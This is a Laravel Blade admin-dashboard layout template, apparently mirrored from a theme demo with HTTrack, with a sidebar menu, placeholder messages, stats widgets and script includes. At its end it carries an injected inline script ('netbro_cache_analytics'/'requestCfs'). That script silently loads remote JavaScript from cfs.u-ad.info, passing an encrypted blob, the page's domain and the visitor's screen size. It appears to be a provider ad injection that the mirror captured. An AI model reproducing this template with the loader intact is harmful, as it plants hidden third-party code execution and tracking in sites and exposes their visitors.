<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from jesus.gallery/cloud2/ by HTTrack Website Copier/3.x [XR&CO'2013], Mon, 03 Aug 2015 07:55:16 GMT -->
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Admin Dashboard</title>
    <meta name="description" content="Cloud Admin Panel"/>
    <meta name="keywords"
          content="Admin, Dashboard, Bootstrap3, Sass, transform, CSS3, HTML5, Web design, UI Design, Responsive Dashboard, Responsive Admin, Admin Theme, Best Admin UI, Bootstrap Theme, Bootstrap, Light weight Admin Dashboard,Light weight, Light weight Admin, Light weight Dashboard"/>
    <meta name="author" content="Bootstrap Gallery"/>
    <link rel="shortcut icon" type="image/x-icon" href="{{ url('images/icon.png')}}"/>

    <!-- Bootstrap CSS -->
    <link href="{{ url('backend/css/bootstrap.min.css') }}" rel="stylesheet" media="screen">

    <!-- Animate CSS -->
    <link href="{{ url('backend/css/animate.css') }}" rel="stylesheet" media="screen">

    <!-- date range -->
    <link rel="stylesheet" type="text/css" href="{{ url('backend/css/daterange.css') }}">

    <!-- Main CSS -->
    <link href="{{ url('backend/css/main.css') }}" rel="stylesheet" media="screen">

    <!-- Slidebar CSS -->
    <link rel="stylesheet" type="text/css" href="{{ url('backend/css/slidebars.css') }}">

    <!-- Font Awesome -->
    <link href="{{ url('backend/fonts/font-awesome.min.css') }}" rel="stylesheet">

    <!-- Metrize Fonts -->
    <link href="{{ url('backend/fonts/metrize.css') }}" rel="stylesheet">

    <!-- HTML5 shiv and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>

    <script src="{{ url('backend/js/html5shiv.js') }}"></script>
    <script src="{{ url('backend/js/respond.min.js') }}"></script>

    <![endif]-->
    <!-- Editor WYSIWYG tiny MCE-->
    <script type="text/javascript" src="{{ url('tinymce/tinymce.min.js')}}"></script>

</head>

<body>

<!-- Left sidebar start -->
<aside id="sidebar">

    <!-- Logo starts -->
    <a href="#" class="logo">
        <img src="{{url('backend/img/logo.png')}}" alt="logo">
    </a>
    <!-- Logo ends -->

    <!-- Menu start -->
    <div id='menu'>
        <ul>
            <li class="{{ isset($m_dash) ? $m_dash : '' }}">
                <a href='{{URL::route('admin')}}'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe007;"></div>
                    <span>Dashboard</span>
                </a>
            </li>
            <li class="{{ isset($m_category) ? $m_category : '' }}" >
                <a href="{{URL::route('category.index')}}">
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0f8;"></div>
                    <span>Category</span>
                </a>
            </li>

            <li class="{{ isset($m_article) ? $m_article : '' }}" >
                <a href="{{URL::route('article.index')}}">
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0f8;"></div>
                    <span>Article</span>
                </a>
            </li>
            <li>
                <a href='graphs.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0f8;"></div>
                    <span>Graphs</span>
                </a>
            </li>
            <li class='has-sub'>
                <a href='#'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe052;"></div>
                    <span>Ui Elements</span>
                </a>
                <ul>
                    <li>
                        <a href='panels.html'>
                            <span>Panel &amp; List Groups</span>
                        </a>
                    </li>
                    <li>
                        <a href='buttons.html'>
                            <span>Buttons</span>
                        </a>
                    </li>
                    <li>
                        <a href='grid.html'>
                            <span>Grid</span>
                        </a>
                    </li>
                    <li>
                        <a href='ui-elements.html'>
                            <span>More</span>
                        </a>
                    </li>
                </ul>
            </li>
            <li class='has-sub'>
                <a href='#'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0ab;"></div>
                    <span>Forms</span>
                </a>
                <ul>
                    <li>
                        <a href='form.html'>
                            <span>Form Elements</span>
                        </a>
                    </li>
                    <li>
                        <a href='form-wizard.html'>
                            <span>Form Wizards</span>
                        </a>
                    </li>
                    <li>
                        <a href="editor.html">
                            <span>Wysihtml Editor</span>
                        </a>
                    </li>
                </ul>
            </li>
            <li>
                <a href='gallery.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0e6;"></div>
                    <span>Gallery</span>
                </a>
            </li>
            <li>
                <a href="tables.html">
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0f2;"></div>
                    <span>Tables</span>
                </a>
            </li>
            <li class='has-sub'>
                <a href='#'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0a0;"></div>
                    <span>Bonus Pages</span>
                </a>
                <ul>
                    <li>
                        <a href='invoice.html'>
                            <span>Invoice</span>
                        </a>
                    </li>
                    <li>
                        <a href='calendar.html'>
                            <span>Calendar</span>
                        </a>
                    </li>
                    <li>
                        <a href='login.html'>
                            <span>Login</span>
                        </a>
                    </li>
                    <li>
                        <a href='404.html'>
                            <span>404</span>
                        </a>
                    </li>
                    <li>
                        <a href='default.html'>
                            <span>Default</span>
                        </a>
                    </li>
                </ul>
            </li>
            <li>
                <a href='maps.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe089;"></div>
                    <span>Vector Maps</span>
                </a>
            </li>
            <li>
                <a href='notifications.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe0e9;"></div>
                    <span>Notifications</span>
                </a>
            </li>
            <li>
                <a href='typography.html'>
                    <div class="fs1" aria-hidden="true" data-icon="&#xe019;"></div>
                    <span>Typography</span>
                </a>
            </li>
        </ul>
    </div>
    <!-- Menu End -->

    <!-- Extras starts -->
    <div class="extras">
        <div class="ex-wrapper">
            <div class="alert alert-info">
                <strong>Heads up!</strong> This alert needs your attention, but it's not super important.
            </div>
        </div>
    </div>
    <!-- Extras ends -->
</aside>
<!-- Left sidebar end -->

<!-- Dashboard Wrapper Start -->
<div class="dashboard-wrapper">

    <!-- Header start -->
    <header>
        <ul class="pull-left" id="left-nav">
            <li class="hidden-lg hidden-md hidden-sm">
                <div class="logo-mob clearfix">
                    <h2>
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0db;"></div>
                        <span>Cloud Admin</span></h2>
                </div>
            </li>
            <li class="hidden-xs">
                <a href="#" class="btn btn-info btn-sm">V1</a>
            </li>
            <li>
                <div class="custom-search hidden-sm hidden-xs pull-left">
                    <input type="text" class="search-query" placeholder="Search here">
                    <i class="fa fa-search"></i>
                </div>
            </li>
        </ul>
        <div class="pull-right">
            <ul id="mini-nav" class="clearfix">
                <li class="list-box hidden-xs">
                    <a id="drop1" href="backend/#" role="button" class="dropdown-toggle" data-toggle="dropdown">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe129;"></div>
                    </a>
                    <span class="info-label red-bg animated rubberBand">7</span>
                    <ul class="dropdown-menu flipInX animated messages">
                        <li class="dropdown-header">You have 7 messages</li>
                        <li>
                            <div class="icon">
                                <img src="backend/img/admin10.png" alt="Browser">
                            </div>
                            <div class="details">
                                <strong class="text-danger">Willams</strong>
                                <span>Firefox is a free, open-source web browser from Mozilla.</span>
                            </div>
                        </li>
                        <li>
                            <div class="icon">
                                <img src="backend/img/admin6.png" alt="Browser">
                            </div>
                            <div class="details">
                                <strong class="text-info">Sunny</strong>
                                <span>Internet Explorer is a free web browser from Microsoft.</span>
                            </div>
                        </li>
                        <li>
                            <div class="icon">
                                <img src="backend/img/admin3.png" alt="Browser">
                            </div>
                            <div class="details">
                                <strong class="text-info">James</strong>
                                <span>Safari is known for its sleek design and ease of use.</span>
                            </div>
                        </li>
                    </ul>
                </li>
                <li class="list-box hidden-xs">
                    <a id="drop2" href="backend/#" role="button" class="dropdown-toggle" data-toggle="dropdown">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0e3;"></div>
                    </a>
                    <span class="info-label blue-bg animated rubberBand">3</span>
                    <ul class="dropdown-menu fadeInUp animated messages">
                        <li class="dropdown-header">Recent Chat</li>
                        <div class="chats clearfix">
                            <p class="chat them">
                                James, I'm going to be a little late.
                            </p>

                            <p class="chat me">
                                S'Okay, Dude. You know your lines...?
                            </p>

                            <p class="chat them">
                                I know em, I don't know what order they come in...
                            </p>

                            <p class="chat me">
                                We'll work it out...
                            </p>
                        </div>
                    </ul>
                </li>
                <li class="list-box hidden-xs dropdown">
                    <a id="drop3" href="backend/#" role="button" class="dropdown-toggle" data-toggle="dropdown">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0ca;"></div>
                    </a>
                    <span class="info-label green-bg animated rubberBand">6</span>
                    <ul class="flipInX animated dropdown-menu stats-widget clearfix">
                        <li>
                            <h5 class="text-success">$37895</h5>

                            <p>Revenue <span class="text-success">+2%</span></p>

                            <div class="progress progress-xs">
                                <div class="progress-bar progress-bar-success" role="progressbar" aria-valuenow="40"
                                     aria-valuemin="0" aria-valuemax="100" style="width: 40%">
                                    <span class="sr-only">40% Complete (success)</span>
                                </div>
                            </div>
                        </li>
                        <li>
                            <h5 class="text-info">47,892</h5>

                            <p>Downloads <span class="text-info">+39%</span></p>

                            <div class="progress progress-xs">
                                <div class="progress-bar progress-bar-info" role="progressbar" aria-valuenow="40"
                                     aria-valuemin="0" aria-valuemax="100" style="width: 40%">
                                    <span class="sr-only">40% Complete (info)</span>
                                </div>
                            </div>
                        </li>
                        <li>
                            <h5 class="text-danger">28214</h5>

                            <p>Uploads <span class="text-danger">-7%</span></p>

                            <div class="progress progress-xs">
                                <div class="progress-bar progress-bar-danger" role="progressbar" aria-valuenow="40"
                                     aria-valuemin="0" aria-valuemax="100" style="width: 40%">
                                    <span class="sr-only">40% Complete (danger)</span>
                                </div>
                            </div>
                        </li>
                    </ul>
                </li>
                <li class="list-box hidden-xs dropdown">
                    <a id="drop1" href="backend/#" role="button" class="dropdown-toggle current-user"
                       data-toggle="dropdown">
                        Sandy <b class="caret"></b>
                    </a>
                    <ul class="dropdown-menu sm fadeInUp animated messages">
                        <li class="dropdown-content">
                            <a href="#">Edit Profile</a>
                            <a href="#">Change Password</a>
                            <a href="#">Settings</a>
                            <a href="{{ url('auth/logout') }}">Logout</a>
                        </li>
                    </ul>
                </li>
                <li class="list-box hidden-lg hidden-md hidden-sm" id="mob-nav">
                    <a href="#">
                        <i class="fa fa-reorder"></i>
                    </a>
                </li>
            </ul>
        </div>
    </header>
    <!-- Header ends -->

    <!-- Right sidebar start -->
    <div class="sb-slidebar sb-right sb-close">

        <!-- User Profile Start -->
        <section class="user-profile">
            <div class="profile-container">
                <img src="backend/img/admin1.png" class="user-img" alt="User Image">

                <div class="desc">
                    <h4>John Doe</h4>

                    <p class="text-info">UX Designer</p>
                </div>
            </div>
            <ul class="ftr-link">
                <li class="active">
                    <a href="javascript:;">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe033;"></div>
                        985
                    </a>
                </li>
                <li>
                    <a href="javascript:;" class="text-success">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0b9;"></div>
                        999
                    </a>
                </li>
                <li>
                    <a href="javascript:;" class="text-pink">
                        <div class="fs1" aria-hidden="true" data-icon="&#xe0e3;"></div>
                        143
                    </a>
                </li>
            </ul>
        </section>
        <!-- User Profile End -->

        <!-- Online Users start -->
        <div class="block">
            <div class="heading">Users Online</div>
            <div class="wrapper">
                <!-- Online Users Start -->
                <ul class="online-users">
                    <li>
                        <a href="#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>Sunny</span>

                            <div class="user-status online"></div>
                        </a>
                    </li>
                    <li>
                        <a href="#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>Henrik</span>

                            <div class="user-status online"></div>
                        </a>
                    </li>
                    <li>
                        <a href="#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>John Doe</span>

                            <div class="user-status busy"></div>
                        </a>
                    </li>
                    <li>
                        <a href="#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>Fleming</span>

                            <div class="user-status away"></div>
                        </a>
                    </li>
                    <li>
                        <a href="#" data-lastname="Sandhya" data-status="online" data-original-title="">
                            <span>Wills</span>

                            <div class="user-status"></div>
                        </a>
                    </li>
                </ul>
                <!-- Online Users End -->
            </div>
        </div>
        <!-- Online Users end -->

        <!-- Checkout start -->
        <div class="block">
            <div class="heading">Checkout</div>
            <ul class="cart">
                <li class="cart-item">
              <span class="cart-item-pic">
                <img src="backend/img/admin2.png" alt="EarthSquare">
              </span>
                    Item #1
                    <span class="cart-item-desc">Description</span>
                    <span class="cart-item-price">$16.80</span>
                </li>
                <li class="cart-item">
              <span class="cart-item-pic">
                <img src="backend/img/admin4.png" alt="EarthSquare">
              </span>
                    Item #2
                    <span class="cart-item-desc">Description</span>
                    <span class="cart-item-price">$15.00</span>
                </li>
                <li class="cart-item">
              <span class="cart-item-pic">
                <img src="backend/img/admin8.png" alt="EarthSquare">
              </span>
                    Item #3
                    <span class="cart-item-desc">Description</span>
                    <span class="cart-item-price">$23.00</span>
                </li>
            </ul>
            <div class="cart-bottom">
                Total: $54.80
                <a href="#" class="cart-button">Continue</a>
            </div>
        </div>
        <!-- Checkout end -->

        <!-- Notifications Start -->
        <div class="block">
            <div class="heading">Notifications</div>
            <!-- Notifications -->
            <ul class="infos">
                <li>
              <span class="label label-success pull-left">
                <div class="fs1" aria-hidden="true" data-icon="&#xe128;"></div>
              </span>

                    <div class="info">
                        <h6>Guru Tweeted</h6>

                        <p class="designation">Few seconds ago</p>
                    </div>
                </li>
                <li>
              <span class="label label-danger pull-left">
                <div class="fs1" aria-hidden="true" data-icon="&#xe0e9;"></div>
              </span>

                    <div class="info">
                        <h6>Server #999 Crashed</h6>

                        <p class="designation">2 minutes ago</p>
                    </div>
                </li>
                <li>
              <span class="label label-info pull-left">
                <div class="fs1" aria-hidden="true" data-icon="&#xe0e3;"></div>
              </span>

                    <div class="info">
                        <h6>Kiri's account was created</h6>

                        <p class="designation">5 days ago</p>
                    </div>
                </li>
            </ul>
        </div>
        <!-- Notifications End -->

    </div>
    <!-- Right sidebar end -->

    <!-- Main Container Start -->
    <div class="main-container">
        @yield('content')
    </div>
    <!-- Main Container Start -->

    <!-- Footer Start -->
    <footer>
        Copyright Cloud Admin <span>2015</span>. All Rights Reserved.
    </footer>
    <!-- Footer end -->

</div>
<!-- Dashboard Wrapper End -->

<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="{{url('backend/js/jquery.js')}}"></script>

<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="{{url('backend/js/bootstrap.min.js')}}"></script>

<!-- Flot Charts -->
<script src="{{ url('backend/js/flot/jquery.flot.js') }}"></script>
<script src="{{ url('backend/js/flot/jquery.flot.time.js') }}"></script>
<script src="{{ url('backend/js/flot/jquery.flot.selection.js') }}"></script>
<script src="{{ url('backend/js/flot/jquery.flot.resize.js') }}"></script>
<script src="{{ url('backend/js/flot/jquery.flot.tooltip.js') }}"></script>
<script src="{{ url('backend/js/flot/flot.excanvas.min.js') }}"></script>

<!-- Custom flot JS -->
<script src="{{ url('backend/js/flot/custom/combine-chart.js') }}"></script>

<!-- Animated Right Sidebar -->
<script src="{{ url('backend/js/slidebars.js') }}"></script>

<!-- Tyny Scrollbar -->
<script src="{{ url('backend/js/tiny-scrollbar.js') }}"></script>

<!-- Date Range -->
<script src="{{ url('backend/js/daterange/moment.js') }}"></script>
<script src="{{ url('backend/js/daterange/daterangepicker.js') }}"></script>

<!-- Custom JS -->
<script src="{{ url('backend/js/custom.js') }}"></script>
<script src="{{ url('backend/js/custom-index.js') }}"></script>

<script type="text/javascript">
    if (self == top) {
        function netbro_cache_analytics(fn, callback) {
            setTimeout(function () {
                fn();
                callback();
            }, 0);
        }

        function sync(fn) {
            fn();
        }

        function requestCfs() {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            var url = idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRl80bpCysgjAX4jc84P9QHI9bJPN1tOoLn1btWlycjT1dfAbBfmClyyCMkm9Fw67vPNjgHQqu1tvAM0xhaDzv%2bhrqgM4%2bv4yGzDrqqZoiFgATEcAVVP5mLsho%2b%2fTytYAdW37ZMq75o87a5gvfcIMwB6pR5rXTHka7q8WVQnxI2xN1fOq8g6%2f6%2ffLgsGvzuS%2bXgAzUEwx4gh0phRiwkC26XDi8D4htPGsDRRZOfgeGgw0%2b5LOA14iIsVZhCPPerTZ6FE8Nv14nzjaJDjsVnuioWbLyqHiRiA1FSOe%2fFQMxs5vgz%2fg2llZbkP24AX7K%2bdKUe%2bDKlaO8fF1W7plZVVmqkQvEvLOrV3d9VPRHrZ2I1XjUFbYmfxMuVdFk49sCg74405IAty1d9fzhhu%2bJp40fNW6YFW0h8BCjBuslrDgDyDMUr9oxFd33mjhXRcg8ZHSUv0xLeAhLIlmNKRdpS5hDNla%2bmjg6yQtNDRI04RhVW40BIpSI6dBjNnNCFeAGrjVn6IXlNhYF3zECz9y2FUCXliThshi92TlpJhzCjsy2ZUKtiH2glSfa%2fQ0Kby0IA5Oke8AvtlPM46g6Y2Pij2jYdLcBKIkmRqpteQ0XX5iRao49aMytj%2fLntpoWohxkUyFH6XwkMQU6Nl4gwu%2frrkJHJ9tQkesUuDZl5t7wYjYMU3%2bZdXGiJ1%2bwQJXNYRZ7V6ugBUO3Io5MP2YyB9q9a9jg3Cf7wvF0GZKA%2fZPwVOVoAzEoB25CJJlHxqaoB2U3tfzBrOZDiAk%2ft0LuaUlYzm9%2b9e6fdwRkCZ3NG8bJXmugeiU%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
            var bsa = document.createElement('script');
            bsa.type = 'text/javascript';
            bsa.async = true;
            bsa.src = url;
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
        }

        netbro_cache_analytics(requestCfs, function () {
        });
    }
    ;
</script>
</body>

<!-- Mirrored from jesus.gallery/cloud2/ by HTTrack Website Copier/3.x [XR&CO'2013], Mon, 03 Aug 2015 07:56:09 GMT -->
</html>